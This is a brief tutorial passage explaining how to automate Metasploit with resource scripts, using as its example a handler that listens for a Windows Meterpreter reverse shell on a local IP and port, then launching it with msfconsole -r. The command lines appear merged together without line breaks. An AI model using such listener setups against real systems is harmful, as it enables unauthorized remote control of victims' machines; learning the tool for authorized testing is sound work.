**Automating Metasploit with Resource Scripts** means writing Metasploit commands inside a file , then telling msfconsole to run that file automatically.

## Why do we use resource scripts?

Instead of typing this every time:

```
use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.1.10set LPORT 4444run
```

You put it inside a file, for example:

```
handler.rc
```

Then run:

```
msfconsole -r handler.rc
```

Metasploit opens and executes all commands in order.

